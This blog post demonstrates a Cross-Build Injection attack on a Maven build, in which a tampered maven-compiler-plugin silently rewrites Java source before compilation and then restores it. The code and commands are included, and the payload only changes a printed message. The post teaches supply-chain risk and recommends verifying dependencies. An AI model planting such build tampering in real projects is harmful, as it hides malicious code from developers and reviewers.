---
layout: post
title: "Cross-Build Injection in action" 
category : security 
tags : [maven, java, security, pgp]
excerpt: "A [previous post](/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build) introduced Cross-Build Injection (XBI) attacks. Recently, I've had the opportunity to present this work at JavaOne. In that session, I used a live example to show what could go wrong. By popular request, this post outlines the example XBI attack that I used as demonstration."

---

The setup consists of a trivial Maven project called 'hacked' ([download here](/dl/xbi_code.zip)) with a single class that prints the exciting message "Hi there"... or does it? Along the way, we'll introduce a nefarious version of the maven-compiler-plugin which mixes things up a bit!

### Hello world under attack

So how do we get this innocent snippet of Java:

{% highlight java %}
public class Test {

  public static void main(String... args) {
    System.out.println("Hi there");
  } 

}
{% endhighlight %}

to print "Hi, you've been p0wned" rather than the bland "Hi there" message using a Cross-Build Injection attack? The central premise of my [Cross-Build Injection Attacks](/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build) talk is that this depends on how secure your build setup is. Let's take a look at a typical Maven-based setup. When we do a "mvn clean install" on the project containing the Test class, the following happens:

![Maven and XBI](/pics/xbi_setup.png)

Maven downloads both the dependencies of your application (none in this case) and the plugins (including any dependencies) it needs for its own functioning. We defined version 2.5.1 of the maven-compiler-plugin in the pom.xml, so it is retrieved from Maven Central over a regular http connection. Of course this is prone to all kinds foul play, as discussed in the [original article](/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build). 

### Use the source

Rather than creating a network setup that intercepts and replaces Maven request/responses, let's just place a compromised artifact in our local repository manually, to simulate the effects of an XBI attack. Since the maven-compiler-plugin orchestrates the actual invocation of the Java compiler, it seems like a good place to subvert the build process. Fortunately the source is just an [svn checkout](http://svn.apache.org/repos/asf/maven/plugins/tags/maven-compiler-plugin-2.5.1) away. A little digging finds us the AbstractCompilerMojo class, containing an execute() method which ultimately invokes the compiler. So let's get to it and change it to our liking:

{% highlight java %}
public abstract class AbstractCompilerMojo extends AbstractMojo {

  // ... snipped lots of code ...

  public void execute() 
  	throws MojoExecutionException, CompilationFailureException {
    
    File src = new File(basedir + "/src/main/java/Test.java");
    String original = null;
    try {
        original = FileUtils.fileRead(src);
        String replaced = original.replace(" there", ", you been p0wned!");
        FileUtils.fileWrite(src, replaced);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }

    try {
    	// original body of execute() here, calling the 
    	// compiler with the replaced source...
    } finally {
    	try {
            FileUtils.fileWrite(src, original);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
  } 

}
{% endhighlight %}
(For the lazy bunch, here's the code (including the modified maven-compiler-plugin) in a convenient [download](/dl/xbi_code.zip).)

The first try-block reads the original source, stores it for later use and overwrites the original source with our replaced code. When the actual Java compiler later on reads the source, it sees our modified version. Of course, this is horribly hardcoded towards our example, but you can make this as smart as you want (discover and parse all sources, transform them conditionally et cetera). Then, the last try-block calls the original code of execute(). Since the original code has many return points, we use the finally-block to ensure we always write back the original source to Test.java. Nobody will see what just happened to the source being compiled...

To bring our version of the maven-compiler-plugin in place, execute
{% highlight sh %}
:maven-compiler-plugin$ mvn clean install -DskipTests
{% endhighlight %}
in the maven-compiler-plugin project that we just 'improved'. The skipTests flag is necessary since our 'improvement' obviously fails any sensible unit test in the compiler plugin. Now this nefarious version of the compiler plugin lives in your local repository.

### Compile and behold

Just two more steps to see our 'improved' compiler plugin in action. Perform a mvn clean install on the 'hacked' project, and run it:

{% highlight sh %}
:hacked$ mvn clean install
.. snipped ..
[INFO] --- maven-compiler-plugin:2.5.1:compile (default-compile) @ hacked ---
[INFO] Compiling 1 source file to .../hacked/target/classes
.. snipped ..
[INFO] -------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] -------------------------------------------------------------------
.. snipped ..

:hacked$ java -cp ./target/classes Test
Hi, you've been p0wned!
{% endhighlight %}

There you have it: when compiled using this maven-compiler-plugin implementation, our original class seems to be untouched but the resulting .class file will print the unexpected message. And remember, we use a plain and uncompromised install of both Maven and the Java compiler. However, because Maven downloads a plugin before compiling, arbitrary code may be executed if you are not careful!

### Exploiting XBI

Now of course this example would be easily caught by your friendly QA department. But think about it. What could really happen if arbitrary code were injected into your build process, or into your application? How about a backdoor? Or, if a hacker is really smart... Replace an up-to-date library with a previous version containing a known vulnerability, while pretending it is the current version. As you can see, there's plenty of options. Here's some [more inspiration](http://www.koch.ro/blog/index.php?url=archives/153-On-distributing-binaries.html) if you're still not convinced. So make sure [you verify](/blog/security/2012/08/verify-dependencies-using-pgp/) what you put into your build system and application. Trust is in short supply. Use it sparingly.

For some more context, here are the slides of the talk I gave at JavaOne on Cross-Build Injection attacks:

<iframe src="http://www.slideshare.net/slideshow/embed_code/14579226" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no">embed</iframe>
  
  
Have fun, and remember: build safely!

